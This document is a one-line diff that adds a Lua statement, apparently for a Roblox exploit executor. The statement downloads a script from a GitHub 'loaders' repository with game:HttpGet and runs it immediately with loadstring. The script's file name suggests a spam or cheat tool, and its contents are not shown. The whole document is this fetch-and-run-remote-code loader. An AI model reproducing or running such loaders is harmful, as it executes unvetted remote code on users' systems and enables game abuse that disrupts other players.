@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/makeup-star-spam4-8uwsmmq0ih8tx3.lua"))()
